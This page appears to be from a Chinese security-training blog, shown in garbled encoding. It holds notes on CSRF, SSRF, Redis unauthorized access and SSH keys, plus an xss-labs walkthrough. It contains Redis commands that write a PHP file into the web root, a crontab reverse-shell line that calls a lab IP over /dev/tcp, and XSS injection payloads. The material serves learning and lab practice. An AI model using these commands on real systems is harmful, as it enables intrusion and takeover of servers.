<h2 id="CSRFæˆå› åŠåŸç†"><a href="#CSRFæˆå› åŠåŸç†" class="headerlink" title="CSRFæˆå› åŠåŸç†"></a>CSRFæˆå› åŠåŸç†</h2><p><strong>æˆå› ï¼š</strong>CSRFæ¼æ´çš„æˆå› å°±æ˜¯<strong>ç½‘ç«™çš„cookieåœ¨æµè§ˆå™¨ä¸­ä¸ä¼šè¿‡æœŸ</strong>ï¼Œåªè¦ä¸å…³é—­æµè§ˆå™¨æˆ–è€…é€€å‡ºç™»å½•ï¼Œé‚£ä¹‹ååªè¦æ˜¯è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œéƒ½ä¼šé»˜è®¤ä½ å·²ç»ç™»å½•çš„çŠ¶æ€ã€‚è€Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œæ”»å‡»è€…å‘é€æ„é€ å¥½çš„CSRFè„šæœ¬æˆ–åŒ…å«CSRFè„šæœ¬çš„é“¾æ¥ï¼Œå¯èƒ½ä¼šæ‰§è¡Œä¸€äº›ç”¨æˆ·ä¸æƒ³åšçš„åŠŸèƒ½ã€‚</p>
<p><strong>é˜²æŠ¤ï¼š</strong></p>
<ol>
<li>éªŒè¯referer</li>
<li>åŠ token</li>
</ol>
<h2 id="SSRFæˆå› åŠåŸç†"><a href="#SSRFæˆå› åŠåŸç†" class="headerlink" title="SSRFæˆå› åŠåŸç†"></a>SSRFæˆå› åŠåŸç†</h2><p><strong>æˆå› ï¼š</strong>æœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯¹ç›®æ ‡åœ°å€æ²¡æœ‰åšä¸¥æ ¼çš„è¿‡æ»¤ï¼</p>
<p><strong>é˜²æŠ¤ï¼š</strong></p>
<ol start="2">
<li>è®¾ç½®urlç™½åå•ï¼Œé™åˆ¶è®¿é—®çš„IPåœ°å€ã€å†…ç½‘ã€‘</li>
<li>é™åˆ¶è®¿é—®çš„ç«¯å£</li>
<li>è®¾ç½®ç»Ÿä¸€çš„é”™è¯¯å¤„ç†é¡µé¢ï¼Œé˜²æ­¢ä¿¡æ¯æ³„æ¼ï¼</li>
</ol>
<h2 id="æ¼æ´ç±»å‹"><a href="#æ¼æ´ç±»å‹" class="headerlink" title="æ¼æ´ç±»å‹"></a>æ¼æ´ç±»å‹</h2><p>sqlæ³¨å…¥ã€xssã€ååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€CSRFã€SSRF</p>
<h2 id="æŠ¤ç½‘å¸¸è§è®¾å¤‡"><a href="#æŠ¤ç½‘å¸¸è§è®¾å¤‡" class="headerlink" title="æŠ¤ç½‘å¸¸è§è®¾å¤‡"></a>æŠ¤ç½‘å¸¸è§è®¾å¤‡</h2><p>WAFã€æ€åŠ¿æ„ŸçŸ¥ã€IPSã€äº‘é˜²ã€æ•°æ®åº“å®¡è®¡</p>
<h2 id="åŠ å›ºæ–¹æ¡ˆ"><a href="#åŠ å›ºæ–¹æ¡ˆ" class="headerlink" title="åŠ å›ºæ–¹æ¡ˆ"></a>åŠ å›ºæ–¹æ¡ˆ</h2><h1 id="03-18åŸ¹è®­ç¬”è®°"><a href="#03-18åŸ¹è®­ç¬”è®°" class="headerlink" title="03.18åŸ¹è®­ç¬”è®°"></a>03.18åŸ¹è®­ç¬”è®°</h1><h2 id="redisï¼ˆç«¯å£6379ï¼‰"><a href="#redisï¼ˆç«¯å£6379ï¼‰" class="headerlink" title="redisï¼ˆç«¯å£6379ï¼‰"></a>redisï¼ˆç«¯å£6379ï¼‰</h2><p>ä½œç”¨</p>
<ol>
<li>å®ç°ç¼“å­˜åŠŸèƒ½</li>
<li>è¿›è¡Œé”®å€¼å¯¹å­˜å‚¨</li>
<li>æ„å»ºé›†ç¾¤åŒ–æœåŠ¡ã€rediså“¨å…µ</li>
</ol>
<p>redisæœªæˆæƒæ¡ä»¶ï¼š</p>
<p>ç»‘å®šäº†IPï¼š0.0.0.0ï¼Œä¸”redisæ²¡æœ‰å¼€å¯å¯†ç è®¤è¯åŠŸèƒ½</p>
<p>ç™»å½•ï¼š0.0.0.0:6379  -&gt; configæ‰§è¡Œå¯¹æ–‡ä»¶çš„å†™æ“ä½œï¼Œå°†è‡ªå·±çš„sshçš„å…¬é’¥å†™å…¥åˆ°ç›®æ ‡çš„æœåŠ¡å™¨ä¸­</p>
<p>ä¿®å¤ï¼š</p>
<ol>
<li>rediså¼€å¯å¯†ç è®¤è¯ï¼Œç»‘å®š127.0.0.1</li>
<li>ä½¿ç”¨é˜²ç«å¢™</li>
</ol>
<h2 id="sshå…å¯†ç™»å½•"><a href="#sshå…å¯†ç™»å½•" class="headerlink" title="sshå…å¯†ç™»å½•"></a>sshå…å¯†ç™»å½•</h2><h3 id="sshç™»å½•åŸç†ï¼š"><a href="#sshç™»å½•åŸç†ï¼š" class="headerlink" title="sshç™»å½•åŸç†ï¼š"></a>sshç™»å½•åŸç†ï¼š</h3><ol>
<li>Clientå°†è‡ªå·±çš„å…¬é’¥å­˜æ”¾åœ¨Serverä¸Šï¼Œè¿½åŠ åœ¨æ–‡ä»¶authorized_keysä¸­ã€‚</li>
<li>Serverç«¯æ¥æ”¶åˆ°Clientçš„è¿æ¥è¯·æ±‚åï¼Œä¼šåœ¨authorized_keysä¸­åŒ¹é…åˆ°Clientçš„å…¬é’¥pubKeyï¼Œå¹¶ç”Ÿæˆéšæœºæ•°Rï¼Œç”¨Clientçš„å…¬é’¥å¯¹è¯¥éšæœºæ•°è¿›è¡ŒåŠ å¯†å¾—åˆ°pubKey(R)ï¼Œç„¶åå°†åŠ å¯†åä¿¡æ¯å‘é€ç»™Clientã€‚</li>
<li>Clientç«¯é€šè¿‡ç§é’¥è¿›è¡Œè§£å¯†å¾—åˆ°éšæœºæ•°Rï¼Œç„¶åå¯¹éšæœºæ•°Rå’Œæœ¬æ¬¡ä¼šè¯çš„SessionKeyåˆ©ç”¨MD5ç”Ÿæˆæ‘˜è¦Digest1ï¼Œå‘é€ç»™Serverç«¯ã€‚</li>
<li>Serverç«¯ä¼šä¹Ÿä¼šå¯¹Rå’ŒSessionKeyåˆ©ç”¨åŒæ ·æ‘˜è¦ç®—æ³•ç”ŸæˆDigest2ã€‚</li>
<li>Serverç«¯ä¼šæœ€åæ¯”è¾ƒDigest1å’ŒDigest2æ˜¯å¦ç›¸åŒï¼Œå®Œæˆè®¤è¯è¿‡ç¨‹ã€‚</li>
</ol>
<h3 id="æœ¬æœºæµ‹è¯•ï¼š"><a href="#æœ¬æœºæµ‹è¯•ï¼š" class="headerlink" title="æœ¬æœºæµ‹è¯•ï¼š"></a>æœ¬æœºæµ‹è¯•ï¼š</h3><p>æµ‹è¯•æœºï¼š</p>
<ol>
<li>kali2021ï¼š192.168.33.128</li>
<li>owaspbwaï¼š192.168.33.132</li>
</ol>
<p>æµ‹è¯•æµç¨‹ï¼š</p>
<p>å…ˆæ‹¿kali2021å°è¯•ä¼ æ–‡ä»¶ç»™owaï¼š</p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-2.png" alt="1-2"></p>
<p>å‘ç°éœ€è¦è¾“å…¥å¯†ç ï¼ŒåŒæ—¶å‘ç°æœ¬åœ°.sshé‡Œå¤šäº†ä¸ªknown_hosts</p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-3.png" alt="1-3"></p>
<blockquote>
<h5 id="1-known-hostsä¸­å­˜å‚¨çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-known-hostsä¸­å­˜å‚¨çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1. known_hostsä¸­å­˜å‚¨çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ"></a>1. known_hostsä¸­å­˜å‚¨çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ</h5><p>known_hostsä¸­å­˜å‚¨æ˜¯å·²è®¤è¯çš„è¿œç¨‹ä¸»æœºhost keyï¼Œæ¯ä¸ªSSH Serveréƒ½æœ‰ä¸€ä¸ª<strong>secret, unique ID, called a host key</strong>ã€‚</p>
<h5 id="2-host-keyä½•æ—¶åŠ å…¥known-hostsçš„ï¼Ÿ"><a href="#2-host-keyä½•æ—¶åŠ å…¥known-hostsçš„ï¼Ÿ" class="headerlink" title="2. host keyä½•æ—¶åŠ å…¥known_hostsçš„ï¼Ÿ"></a>2. host keyä½•æ—¶åŠ å…¥known_hostsçš„ï¼Ÿ</h5><p>å½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡é€šè¿‡SSHç™»å½•è¿œç¨‹ä¸»æœºçš„æ—¶å€™ï¼ŒClientç«¯ä¼šæœ‰å¦‚ä¸‹æç¤ºï¼š</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host key not found <span class="keyword">from</span> the list of known hosts.</span><br><span class="line"><span class="function">Are you sure you want to <span class="keyword">continue</span> <span class="title">connecting</span> (<span class="params">yes/no</span>)?</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬é€‰æ‹©<strong>yes</strong>ï¼Œé‚£ä¹ˆè¯¥host keyå°±ä¼šè¢«åŠ å…¥åˆ°Clientçš„known_hostsä¸­ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">domain</span> <span class="selector-tag">name</span>+<span class="selector-tag">encryption</span> <span class="selector-tag">algorithm</span>+<span class="selector-tag">host</span> <span class="selector-tag">key</span></span><br><span class="line"><span class="selector-tag">example</span><span class="selector-class">.hostname</span><span class="selector-class">.com</span> <span class="selector-tag">ssh-rsa</span> <span class="selector-tag">AAAAB4NzaC1yc2EAAAABIwAAAQEA</span>ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure>

<h5 id="3-ä¸ºä»€ä¹ˆéœ€è¦known-hostsï¼Ÿ"><a href="#3-ä¸ºä»€ä¹ˆéœ€è¦known-hostsï¼Ÿ" class="headerlink" title="3. ä¸ºä»€ä¹ˆéœ€è¦known_hostsï¼Ÿ"></a>3. ä¸ºä»€ä¹ˆéœ€è¦known_hostsï¼Ÿ</h5><p>æœ€åæ¢è®¨ä¸‹ä¸ºä»€ä¹ˆéœ€è¦known_hostsï¼Œè¿™ä¸ªæ–‡ä»¶ä¸»è¦æ˜¯é€šè¿‡Clientå’ŒServerçš„åŒå‘è®¤è¯ï¼Œä»è€Œé¿å…ä¸­é—´äººï¼ˆ<strong>man-in-the-middle attack</strong>ï¼‰æ”»å‡»ï¼Œæ¯æ¬¡Clientå‘Serverå‘èµ·è¿æ¥çš„æ—¶å€™ï¼Œä¸ä»…ä»…Serverè¦éªŒè¯Clientçš„åˆæ³•æ€§ï¼ŒClientåŒæ ·ä¹Ÿéœ€è¦éªŒè¯Serverçš„èº«ä»½ï¼ŒSSH clientå°±æ˜¯é€šè¿‡known_hostsä¸­çš„host keyæ¥éªŒè¯Serverçš„èº«ä»½çš„ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬åˆ©ç”¨ssh-keygenåœ¨kaliä¸Šç”Ÿæˆå…¬ç§é’¥ï¼š</p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-4.png" alt="1-4"></p>
<p>æˆ‘ä»¬æŠŠå…¬é’¥ç»™owaspbwaï¼š</p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-5.png" alt="1-5"></p>
<p>å‘ç°owaä¸Šå¤šäº†ï¼š</p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-6.png" alt="1-6"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å†æ¬¡ä¼ æ–‡ä»¶ï¼Œå‘ç°ä»¥åŠä¸éœ€è¦å¯†ç ï¼š</p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-7.png" alt="1-7"></p>
<p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/1-8.png" alt="1-8"></p>
<h2 id="åº”æ€¥å“åº”æ’æŸ¥æ€è·¯"><a href="#åº”æ€¥å“åº”æ’æŸ¥æ€è·¯" class="headerlink" title="åº”æ€¥å“åº”æ’æŸ¥æ€è·¯"></a>åº”æ€¥å“åº”æ’æŸ¥æ€è·¯</h2><ol>
<li>æ£€æŸ¥æœåŠ¡å™¨<strong>è´¦å·</strong>å®‰å…¨ï¼ˆæ›´æ¢å¯†ç çš„é¢‘ç‡ä»¥åŠå¤„ç†ä¸å¸¸ç”¨ç”¨æˆ·è´¦å·ï¼‰</li>
<li>æ£€æŸ¥å¼‚å¸¸<strong>è¿›ç¨‹å’Œç«¯å£</strong></li>
<li>æ£€æŸ¥ç³»ç»Ÿçš„<strong>å¯åŠ¨é¡¹</strong>å’Œè®¡åˆ’ä»»åŠ¡</li>
<li>æ£€æŸ¥ç³»ç»Ÿçš„åŸºç¡€ä¿¡æ¯</li>
<li>ç³»ç»Ÿç‰ˆæœ¬å’Œè¡¥ä¸æƒ…å†µ</li>
<li>å¸¸è§çš„å¯ç–‘ç›®å½•</li>
<li>æœ¬åœ°æŸ¥æ€</li>
<li>ç»“åˆæµé‡è¿›è¡Œåˆ†æ</li>
</ol>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p><img src="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/D:%5Cgitblog%5C1%5Csource_posts%5C%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%5C1-1.png" alt="1-1"></p>
<h1 id="03-19åŸ¹è®­ç¬”è®°"><a href="#03-19åŸ¹è®­ç¬”è®°" class="headerlink" title="03.19åŸ¹è®­ç¬”è®°"></a>03.19åŸ¹è®­ç¬”è®°</h1><h2 id="ä¸‰ç§å¯¹rediså…å¯†ç™»å½•çš„æ”»å‡»æ‰‹æ®µ"><a href="#ä¸‰ç§å¯¹rediså…å¯†ç™»å½•çš„æ”»å‡»æ‰‹æ®µ" class="headerlink" title="ä¸‰ç§å¯¹rediså…å¯†ç™»å½•çš„æ”»å‡»æ‰‹æ®µ"></a>ä¸‰ç§å¯¹rediså…å¯†ç™»å½•çš„æ”»å‡»æ‰‹æ®µ</h2><p>1ï¼šåˆ©ç”¨redisæ— ç™»å½•å¯†ç å’Œwebä¸‹å…·æœ‰å†™æƒé™ï¼Œå®ç°webshellè·å–</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html		&#x2F;&#x2F;ä¸ºredisè¯»å–ç¼“å­˜æ•°æ®å®šä¹‰ç›®å½•</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename 1.php			&#x2F;&#x2F;ä¸ºredisè®¾ç½®æ•°æ®åº“ç¼“å­˜çš„å­˜å‚¨æ–‡ä»¶</span><br><span class="line">set aaa &quot;&lt;?php phpinfo(); ?&gt;&quot;		&#x2F;&#x2F;å°†å­˜å‚¨æ•°æ®æ–‡ä»¶ä¸­å†™å…¥å˜é‡å€¼</span><br></pre></td></tr></table></figure>



<p>2ï¼šåˆ©ç”¨crontabç³»ç»Ÿæ’ç¨‹å®ç°shellåå¼¹</p>
<p>åŸç†ï¼šåˆ©ç”¨redisçš„æœªæˆæƒè®¿é—®çš„æ¼æ´ï¼Œç»™ä¸redis-serverä¸€ä¸ªå¯æ‰§è¡Œçš„crontabè®¡åˆ’æ’ç¨‹ï¼Œåœ¨æœ¬ç«¯å¼€å¯ç›‘å¬ä»»æ„ç«¯å£å¯ä»¥å¯ä»¥æ•æ‰åˆ°shellåå¼¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab -l			&#x2F;&#x2F;æŸ¥çœ‹æ’ç¨‹</span><br><span class="line">crontab -e			&#x2F;&#x2F;ç¼–è¾‘æ’ç¨‹	</span><br><span class="line">é‡Œé¢ç¼–è¾‘ï¼š</span><br><span class="line">*&#x2F;1 * * * 5 &#x2F;bin&#x2F;bash &#x2F;root&#x2F;1.sh			&#x2F;&#x2F;å…·ä½“å«ä¹‰è§crontab -h</span><br><span class="line"></span><br><span class="line">set cccã€ä»»æ„å˜é‡ã€‘ &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.77.128&#x2F;6666ã€6666ç«¯å£ã€‘ 0&gt;&amp;1\n\n&quot;</span><br></pre></td></tr></table></figure>



<p>3ï¼šé€šè¿‡redisæœªæˆæƒï¼Œç»™æœåŠ¡å™¨ä¼ è¾“å…¬é’¥ï¼Œåœ¨æœ¬ç«¯ä½¿ç”¨ç§é’¥è¿›è¡Œè¿œç¨‹ç™»å½•</p>
<blockquote>
<p>zshå’Œbashçš„åŒºåˆ«</p>
</blockquote>
<h1 id="æ—¥å¸¸"><a href="#æ—¥å¸¸" class="headerlink" title="æ—¥å¸¸"></a>æ—¥å¸¸</h1><h2 id="03-14"><a href="#03-14" class="headerlink" title="03.14"></a>03.14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant select,update&#x2F;all privileges on db.table to &#39;user&#39;@&#39;ip&#39; identified by &#39;passwd&#39;;</span><br><span class="line">flush grant</span><br><span class="line">&#x2F;&#x2F;ç»™ç”¨æˆ·æˆæƒå¹¶æ›´æ–°</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;init.d&#x2F;apache2 restart			&#x2F;&#x2F;kali é‡å¯apache</span><br><span class="line"># systemctl restart httpd				&#x2F;&#x2F;red haté‡å¯</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">çœ‹æ—¥å¿—ï¼š</span><br><span class="line">&#x2F;var&#x2F;log</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tanlp			&#x2F;&#x2F;æŸ¥çœ‹ç«¯å£</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/02/08/xss-labs/">xss-labs</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-08</time><div class="content"><h1 id="Pass1ã€æ— è¿‡æ»¤ã€‘"><a href="#Pass1ã€æ— è¿‡æ»¤ã€‘" class="headerlink" title="Pass1ã€æ— è¿‡æ»¤ã€‘"></a>Pass1ã€æ— è¿‡æ»¤ã€‘</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>å­—æ¯è¦æœ‰//æˆ–è€…å•åŒå¼•å·ï¼Œæ•°å­—å¯ä»¥çœç•¥</p>
<h1 id="Pass2ã€-gt-é—­åˆã€‘"><a href="#Pass2ã€-gt-é—­åˆã€‘" class="headerlink" title="Pass2ã€&gt;é—­åˆã€‘"></a>Pass2ã€&gt;é—­åˆã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œechoå¤„ç”¨äº†<code>htmlspecialchars()</code></p>
<blockquote>
<h2 id="å®šä¹‰å’Œç”¨æ³•"><a href="#å®šä¹‰å’Œç”¨æ³•" class="headerlink" title="å®šä¹‰å’Œç”¨æ³•"></a>å®šä¹‰å’Œç”¨æ³•</h2><p><code>htmlspecialchars()</code> å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p>
<p>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š</p>
<ul>
<li>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</li>
<li>â€œ ï¼ˆåŒå¼•å·ï¼‰æˆä¸º â€œ</li>
<li>â€˜ ï¼ˆå•å¼•å·ï¼‰æˆä¸º â€˜</li>
<li>&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</li>
<li>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</li>
</ul>
<p>å®ä½“çš„æ„æ€æ˜¯ä»…ä½œæ˜¾ç¤ºä¹‹ç”¨ï¼Œæ²¡æœ‰ç‰¹æ®Šå«ä¹‰</p>
<p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°å­˜åœ¨ç¬¬äºŒå‚æ•°ï¼š</p>
<p>å¯ç”¨çš„å¼•å·ç±»å‹ï¼š</p>
<ul>
<li>ENT_COMPAT - é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å·ã€‚</li>
<li>ENT_QUOTES - ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚</li>
<li>ENT_NOQUOTES - ä¸ç¼–ç ä»»ä½•å¼•å·ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯ä¸è®¾ç½®ç¬¬äºŒå‚æ•°çš„è¯ï¼Œä»…ä¼šè¿‡æ»¤åŒå¼•å·ï¼Œå´æ”¾è¡Œäº†å•å¼•å·</p>
</blockquote>
<p>æ‰€ä»¥åªèƒ½åœ¨inputå¤„æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword&#x3D;ag&quot;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>å˜æˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;ag&quot;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>





<h1 id="Pass3ã€å•å¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘"><a href="#Pass3ã€å•å¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘" class="headerlink" title="Pass3ã€å•å¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘"></a>Pass3ã€å•å¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸¤è¾¹éƒ½htmlspecialchars()äº†ï¼Œä½†æ˜¯æ²¡æœ‰è®¾ç½®ç¬¬äºŒå‚æ•°ï¼Œä¸”valueæ˜¯å•å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥å¯ä»¥å•å¼•å·é—­åˆã€‚</p>
<p>å¯ä»¥æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&#39; onmouseover&#x3D;&#39;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>

<p>æœ€åå˜æˆäº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;ag&#39; onmouseover&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&gt;</span><br></pre></td></tr></table></figure>







<h1 id="Pass4ã€åŒå¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘"><a href="#Pass4ã€åŒå¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘" class="headerlink" title="Pass4ã€åŒå¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘"></a>Pass4ã€åŒå¼•å·é—­åˆè§¦å‘äº‹ä»¶ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿‡æ»¤äº†å°–æ‹¬å·ï¼Œä¸”valueç”¨åŒå¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>

<p>æœ€åå˜æˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;ag&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;</span><br></pre></td></tr></table></figure>







<h1 id="Pass5ã€javascriptä¼ªåè®®ã€‘"><a href="#Pass5ã€javascriptä¼ªåè®®ã€‘" class="headerlink" title="Pass5ã€javascriptä¼ªåè®®ã€‘"></a>Pass5ã€javascriptä¼ªåè®®ã€‘</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†scriptæ ‡ç­¾å’Œè§¦å‘äº‹ä»¶</p>
